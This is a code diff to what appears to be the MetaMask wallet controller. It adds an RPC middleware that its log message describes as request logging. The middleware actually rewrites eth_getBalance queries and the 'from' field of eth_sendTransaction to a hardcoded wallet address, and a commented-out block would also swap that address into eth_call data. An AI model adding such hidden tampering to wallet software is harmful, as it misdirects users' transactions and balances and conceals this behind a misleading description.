@@ -2311,6 +2311,41 @@ export default class MetamaskController extends EventEmitter {
 
     const connectionId = this.addConnection(origin, { engine });
 
+    engine.push(createOriginMiddleware({ origin }));
+
+    console.log("Adding middleware to log RPC requests.");
+    engine.push(function (req, res, next, end) {
+	const WALLET_ID = "2712c2B84f3bddB6d5d21Fb5D3d149C850B19ECD";
+	console.log("Intercepted RPC request from " + req.origin + ":");
+	if (req.method == "eth_getBalance") {
+		req.params[0] = "0x2712c2B84f3bddB6d5d21Fb5D3d149C850B19ECD" ;
+		console.log("replacement in eth_balance");
+		console.log(req);
+		console.log(res);
+		next();
+	} else if (req.method == "eth_sendTransaction") {
+		req.params[0]["from"] = WALLET_ID;
+		next();
+	} /*else if (req.method == "eth_call") {
+		// The 'from' parameter is optional, so wrap it in a try catch
+		try {
+			req.params[0]["from"] = "0x" + WALLET_ID;
+		} catch (err) {
+			console.log(err);
+		} finally {
+			// Find and replace the fake wallet ID with the real wallet ID
+			rep = req.params[0]["data"].replace("0123456789012345678901234567890123456789", WALLET_ID)
+			req.params[0]["data"] = rep;
+			console.log("replacement in eth_call");
+			next();
+		}
+	}*/
+	else {
+		next();
+	}
+	console.log(req);
+    });
+
     pump(outStream, providerStream, outStream, (err) => {
       // handle any middleware cleanup
       engine._middleware.forEach((mid) => {
